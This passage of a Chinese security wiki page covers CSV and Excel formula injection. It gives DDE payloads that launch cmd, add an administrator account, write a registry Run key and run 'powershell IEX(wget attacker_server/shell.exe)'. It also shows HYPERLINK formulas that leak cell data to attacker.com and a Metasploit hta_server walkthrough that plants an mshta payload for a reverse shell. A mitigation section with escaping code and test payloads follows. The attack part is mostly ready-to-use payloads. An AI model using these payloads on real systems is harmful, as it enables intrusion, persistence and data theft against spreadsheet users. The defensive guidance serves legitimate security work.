loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407144913-qv5k54e.cf0f26af.png" alt="image" loading="lazy">​</p><p>【<strong>关于全文信息泄露】</strong></p><p>之前使用 <code>&amp;A1&amp;A2&amp;A3&amp;A4</code>​ 窃取表单数据的方式看起来有点笨重，我找到了一种新的方法来更方便的窃取全文信息。</p><blockquote><p>APPLIES TO: Excel 2016, Excel Online, Excel for Android tablets, Excel Mobile, Excel for Android phones, Less.</p><p><a href="https://support.microsoft.com/en-us/office/concat-function-9b1a9a3f-94ff-41af-9736-694cbd6b4ca2?ui=en-us&amp;rs=en-us&amp;ad=us" target="_blank" rel="noopener noreferrer">CONCAT function - Microsoft Support<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></blockquote><p>2016 之前的 excel 和其他的版本的连接字符串的函数 concatenate 不支持 cell range 的语法，也不能自定义函数，这样的话就没有办法简写，只能生成比较长的 url。但 2016 之后的 excel 我们可以使用 concat 函数，支持传入一个 range，比如 <code>concat(A1:A10)</code>​ ，这样便能直接读取整个表格中的数据。</p><h2 id="rce-钓鱼" tabindex="-1"><a class="header-anchor" href="#rce-钓鱼"><span>RCE 钓鱼</span></a></h2><p>利用 DDE 注入，远程命令执行。在单元格中输入 <code>1+cmd|&#39;/C calc&#39;!A0</code>​，回车后 Excel 会弹出一个框，提醒 Excel 需要启动另外一个程序（cmd）,点击是，Windows 会弹出计算器窗口。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407150613-tbz77hx.451d7949.png" alt="image" loading="lazy">​</p><ul><li><p>老版本比如说：office 2016 默认开启。</p></li><li><p>新版本要手动打开：文件 -- 选项 -- 信任中心 -- 信任中心设置 -- 外部内容 -- 启用动态数据交换服务器启动</p></li></ul><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407151015-9k50g8w.2bde836b.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407152304-9popdwp.b9838268.png" alt="image" loading="lazy">​</p><p>测试了一下 <code>@</code>​ 失败了，其余成功。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407152719-3fk0exd.20c249c0.png" alt="image" loading="lazy">​</p><hr><p><strong>【其他 payload】</strong></p><p>导出 xlsx 文件与 CSV 注入类似，也存在类似的问题，因为都是利用 Excel 公式语法执行系统命令。</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment"># 添加用户</span>
<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/C net user test 123456/add&#39;</span>!A0<span class="token operator">+</span><span class="token operator">&lt;</span>br<span class="token operator">&gt;=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/C net user test 123456/add &amp;&amp; net localgroup administrators test /add&#39;</span>!A0

<span class="token comment"># 修改注册表</span>
<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/C reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v calc /t REG_SZ /d c:\windows\system32\calc.exe /f&#39;</span>!A0

<span class="token comment"># RCE</span>
<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39; /C calc&#39;</span>!A0
<span class="token operator">+</span>cmd<span class="token operator">|</span><span class="token string">&#39; /C calc&#39;</span>!A0
<span class="token operator">-</span>cmd<span class="token operator">|</span><span class="token string">&#39; /C calc&#39;</span>!A0
<span class="token decorator annotation punctuation">@SUM</span><span class="token punctuation">(</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!A0<span class="token punctuation">)</span>

<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/C powershell IEX(wget attacker_server/shell.exe)&#39;</span>!A0
<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c rundll32.exe \\10.0.0.1\3\2\1.dll,0&#39;</span>!_xlbgnm<span class="token punctuation">.</span>A1
<span class="token operator">=</span><span class="token number">10</span><span class="token operator">+</span><span class="token number">20</span><span class="token operator">+</span>cmd<span class="token operator">|</span><span class="token string">&#39; /C calc&#39;</span>!A0
<span class="token decorator annotation punctuation">@SUM</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token operator">*</span>cmd<span class="token operator">|</span><span class="token string">&#39; /C calc&#39;</span>!A0

<span class="token comment"># 信息泄漏</span>
<span class="token operator">=</span>HYPERLINK<span class="token punctuation">(</span><span class="token string">&quot;http://attacker.com/?param1=value1&amp;param2=&quot;</span><span class="token operator">&amp;</span>A1<span class="token operator">&amp;</span><span class="token string">&quot;@attacker.com&quot;</span><span class="token punctuation">)</span>

<span class="token comment"># ======== 修复库的测试 payload</span>
<span class="token decorator annotation punctuation">@pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>parametrize</span><span class="token punctuation">(</span><span class="token string">&quot;input,expected&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token comment"># Sample dangerous payloads</span>
    <span class="token punctuation">(</span><span class="token string">&quot;=1+1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;=1+1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token string">&quot;-1+1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;-1+1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token string">&quot;+1+1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;+1+1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token string">&quot;=1+1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;=1+1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token string">&quot;@A3&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;@A3&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token string">&quot;%1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;%1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token string">&quot;|1+1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;\\|1+1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token string">&quot;=1|2&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;=1\\|2&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token comment"># https://blog.zsec.uk/csv-dangers-mitigations/</span>
    <span class="token punctuation">(</span><span class="token string">&quot;=cmd|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;=cmd\\|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token string">&quot;=cmd|&#39; /C powershell IEX(wget 0r.pe/p)&#39;!A0&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;=cmd\\|&#39; /C powershell IEX(wget 0r.pe/p)&#39;!A0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token string">&quot;@SUM(1+1)*cmd|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;@SUM(1+1)*cmd\\|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token string">&quot;@SUM(1+1)*cmd|&#39; /C powershell IEX(wget 0r.pe/p)&#39;!A0&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;@SUM(1+1)*cmd\\|&#39; /C powershell IEX(wget 0r.pe/p)&#39;!A0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token comment"># https://hackerone.com/reports/72785</span>
    <span class="token punctuation">(</span><span class="token string">&quot;-2+3+cmd|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;-2+3+cmd\\|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token comment"># https://web.archive.org/web/20220516052229/https://www.contextis.com/us/blog/comma-separated-vulnerabilities</span>
    <span class="token punctuation">(</span><span class="token string">&#39;=HYPERLINK(&quot;http://contextis.co.uk?leak=&quot;&amp;A1&amp;A2,&quot;Error: please click for further information&quot;)&#39;</span><span class="token punctuation">,</span>
     <span class="token string">&#39;\&#39;=HYPERLINK(&quot;http://contextis.co.uk?leak=&quot;&amp;A1&amp;A2,&quot;Error: please click for further information&quot;)&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="msf" tabindex="-1"><a class="header-anchor" href="#msf"><span>MSF</span></a></h2><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment"># 利用 MSF 框架反弹 shell，使用 office_word_hta 模块去反弹 shell</span>
msf6 <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>misc<span class="token operator">/</span>hta_server
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> No payload configured<span class="token punctuation">,</span> defaulting to windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp
msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>misc<span class="token operator">/</span>hta_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin">set</span> srvhost <span class="token number">192.168</span><span class="token number">.202</span><span class="token number">.61</span>
srvhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.202</span><span class="token number">.61</span>
msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>misc<span class="token operator">/</span>hta_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Exploit running <span class="token keyword">as</span> background job <span class="token number">0.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Exploit completed<span class="token punctuation">,</span> but no session was created<span class="token punctuation">.</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.202</span><span class="token number">.61</span><span class="token punctuation">:</span><span class="token number">4444</span> 
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Using URL<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token number">.202</span><span class="token number">.61</span><span class="token punctuation">:</span><span class="token number">8080</span><span class="token operator">/</span>JO9CGVsbSAKZKYC<span class="token punctuation">.</span>hta
msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>misc<span class="token operator">/</span>hta_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Server started<span class="token punctuation">.</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后将在 EXCEL 中插入恶意载荷</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>+1+cmd<span class="token operator">|</span><span class="token string">&#39;/c mshta.exe http://192.168.202.61:8080/JO9CGVsbSAKZKYC.hta&#39;</span><span class="token operator">!</span>A0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="漏洞防范" tabindex="-1"><a class="header-anchor" href="#漏洞防范"><span>漏洞防范</span></a></h1><ol><li><p>根据业务场景来严格限制输入格式，比如填 URI 的地方判断 URI 格式是否正确；</p></li><li><p>生成表格文件时，凡是公式字符开头（=、+、-、@）数据，可以添加单引号在首部来阻止被解析。Python 已经有开源的库帮我们写好了此逻辑，可以直接引入使用，详情见 <a href="https://github.com/raphaelm/defusedcsv" target="_blank" rel="noopener noreferrer">GitHub - raphaelm/defusedcsv: Python library to protect your users from Excel injections in CSV-format exports, drop-in replacement for standard library&#39;s csv module<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>。</p></li><li><p>请记住，仅确保不受信任的用户输入不以这些字符开头是不够的。您还需要注意字段分隔符（例如，“ <code>,</code>​​​ ”或“ <code>;</code>​​​ ”）和引号（例如， <code>&#39;</code>​​​ 或 <code>&quot;</code>​​​ ），<strong>因为攻击者可以使用它来启动一个新单元格</strong>，然后在用户输入的中间但在单元格的开头放置危险字符。<a href="https://owasp.org/www-community/attacks/CSV_Injection" target="_blank" rel="noopener noreferrer">CSV Injection | OWASP Foundation<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><ol><li>将每个单元格字段用双引号引起来</li><li>在每个单元格字段前面加上单引号</li><li>使用额外的双引号转义每个双引号</li></ol></li><li><p>问题在于管道 (<code>|</code>​​) 字符，Excel 和其他应用程序解释该字符以执行 <code>{arbitrary}</code>​​ 命令并从这些有效负载向量启动 Windows 二进制文件。通过阅读有关攻击的内容并研究可能的缓解技术，我发现最好的解决方法是在这种攻击场景中转义管道字符，即在管道之前添加 <code>\</code>​​ 。</p></li></ol><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">escape</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">if</span> payload<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">&#39;@&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;+&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;-&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;=&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;%&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
             payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;|&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;\|&quot;</span><span class="token punctuation">)</span>
             payload <span class="token operator">=</span> <span class="token string">&quot;&#39;&quot;</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">&quot;&#39;&quot;</span>
     <span class="token keyword">return</span> payload

<span class="token comment"># An example of payload string</span>
payload <span class="token operator">=</span> <span class="token string">&quot;@cmd|&#39; /C calc&#39;!A0&quot;</span>
<span class="token keyword">print</span> <span class="token string">&quot;The Unescaped version is: &quot;</span> <span class="token operator">+</span>  payload
<span class="token keyword">print</span> <span class="token string">&quot;When passed though escape function the value is: &quot;</span> <span class="token operator">+</span> escape<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="5"><li>来自 Microsoft 的提示</li></ol><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407162659-c019vur.8d78a1dc.png" alt="image" loading="lazy">​</p><h1 id="前人栽树" tabindex="-1"><a class="header-anchor" href="#前人栽树"><span>前人栽树</span></a></h1><ul><li><p><a href="https://owasp.org/www-community/attacks/CSV_Injection" target="_blank" rel="noopener noreferrer">CSV Injection | OWASP Foundation<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></li><li><p><a href="https://blog.zsec.uk/csv-dangers-mitigations/" target="_blank" rel="noopener noreferrer">CSV Injection Mitigations &amp; Dangers (zsec.uk)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> -- 很优秀的一个 blog</p></li><li><p><a href="https://www.thedailybeast.com/this-is-how-cops-trick-dark-web-drug-dealers-into-unmasking-themselves" target="_blank" rel="noopener noreferrer">《This Is How Cops Trick Dark-Web Criminals Into Unmasking Themselves》<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>，这篇文章讲述了 FBI 利用这种技巧来跟踪罪犯。</p><p><a href="https://www.shellcodes.org/Hacking/%E5%85%AC%E5%BC%8F%E6%B3%A8%E5%85%A5%EF%BC%88Formula%20Injection%EF%BC%89%E6%94%BB%E5%87%BB.html" target="_blank" rel="noopener noreferrer">公式注入（Formula Injection）攻击 (shellcodes.org)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></li><li><p><a href="https://shuhari.dev/blog/2019/10/csv-explained" target="_blank" rel="noopener noreferrer">说透 CSV 格式 - SHUHARI 的博客<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></li></ul><h1 id="csv-injection-实例" tabindex="-1"><a class="header-anchor" href="#csv-injection-实例"><span>CSV Injection 实例</span></a></h1><h2 id="环境条件" tabindex="-1"><a class="header-anchor" href="#环境条件"><span>环境条件</span></a></h2><blockquote><p>“由于 csv 并没有通用标准，而 excel 在没有任何标准的前提下把数据中的第一个等号解释为方程，导致了安全问题。”-- 特性</p></blockquote><p>解决方案完全只是为了适配 excel，在适配 excel 的同时，不可能适配其它应用（因为没有统一的标准）”</p><p>因此必然无可避免的副作用就是，如果不是用 excel 来打开，比如使用导入工具把 csv 直接导入到 mysql 数据库，则数据 <code>=X</code>​ 导入到 mysql 后，会变成 <code>=&quot;=X&quot;</code>​。</p><h2 id="漏洞挖掘-1" tabindex="-1"><a class="header-anchor" href="#漏洞挖掘-1"><span>漏洞挖掘</span></a></h2><p>这个是一个<strong>截断</strong>的实例，该程序会给 <code>=、+、-、@</code>​​ 开头的单元格内容添加 <code>=&quot;&quot;</code>​​，即强制引号 <code>&quot;</code>​​ 输出的同时，添加一个额外的 <code>=</code>​​ 前缀来适配 excel。</p><hr><p>payload：</p><p>​<code>=HYPERLINK(&quot;http://baidu.com&quot;,&quot;=cmd|&#39;/C calc&#39;!A0)</code>​</p><p>导出后变成了</p><p>​<code>=&quot;=HYPERLINK(&quot;&quot;http://baidu.com&quot;&quot;,&quot;&quot;=cmd|&#39;/C calc&#39;!A0&quot;</code>​</p><p>这样就导致 cmd 前面的引号 <code>&quot;</code>​ 和第一个引号闭合了，所以后面 <code>=cmd|&#39;/C calc&#39;!A0&quot;</code>​ 就被写到了新的单元格，导致的引号逃逸。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407163507-wv2hca5.249b1d11.png" alt="image" loading="lazy">​</p><h1 id="" tabindex="-1"><a class="header-anchor" href="#"><span></span></a></h1></div><!--[--><!----><!--]--><footer class="vp-page-meta"><div class="vp-meta-item edit-link"><a href="https://github.com/zha0cai/edit/main/src/websec/安全漏洞/CSV 注入.md" rel="noopener noreferrer" target="_blank" aria-label="在 GitHub 上编辑此页" class="nav-link vp-meta-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon edit-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="edit icon"><path d="M430.818 653.65a60.46 60.46 0 0 1-50.96-93.281l71.69-114.012 7.773-10.365L816.038 80.138A60.46 60.46 0 0 1 859.225 62a60.46 60.46 0 0 1 43.186 18.138l43.186 43.186a60.46 60.46 0 0 1 0 86.373L588.879 565.55l-8.637 8.637-117.466 68.234a60.46 60.46 0 0 1-31.958 11.229z"></path><path d="M728.802 962H252.891A190.883 190.883 0 0 1 62.008 771.98V296.934a190.883 190.883 0 0 1 190.883-192.61h267.754a60.46 60.46 0 0 1 0 120.92H252.891a69.962 69.962 0 0 0-69.098 69.099V771.98a69.962 69.962 0 0 0 69.098 69.098h475.911A69.962 69.962 0 0 0 797.9 771.98V503.363a60.46 60.46 0 1 1 120.922 0V771.98A190.883 190.883 0 0 1 728.802 962z"></path></svg><!--]-->在 GitHub 上编辑此页<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-meta-item git-info"><div class="update-time"><span class="vp-meta-label">上次编辑于: </span><!----></div><div class="contributors"><span class="vp-meta-label">贡献者: </span><!--[--><!--[--><span class="vp-meta-info" title="email: 111300972+zha0cai@users.noreply.github.com">zha0cai</span><!--]--><!--]--></div></div></footer><!----><div id="vp-comment" class="giscus-wrapper input-top" style="display:block;"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" preserveAspectRatio="xMidYMid" viewBox="0 0 100 100"><circle cx="28" cy="75" r="11" fill="currentColor"><animate attributeName="fill-opacity" begin="0s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></circle><path fill="none" stroke="#88baf0" stroke-width="10" d="M28 47a28 28 0 0 1 28 28"><animate attributeName="stroke-opacity" begin="0.1s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></path><path fill="none" stroke="#88baf0" stroke-width="10" d="M28 25a50 50 0 0 1 50 50"><animate attributeName="stroke-opacity" begin="0.2s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></path></svg></div><!--[--><!----><!--]--><!--]--></main><!--]--><footer class="vp-footer-wrapper"><div class="vp-footer">Create by zha0cai</div><div class="vp-copyright">Copyright © 2024 Mr.zha0cai </div></footer></div><!--]--><!--[--><!----><!--]--><!--]--></div>
    <script src="/SecWikiPublic/secwiki/assets/js/runtime~app.e52a4695.js" defer></script><script src="/SecWikiPublic/secwiki/assets/js/335.d146fa33.js" defer></script><script src="/SecWikiPublic/secwiki/assets/js/app.e30d6887.js" defer></script>
  </body>
</html>
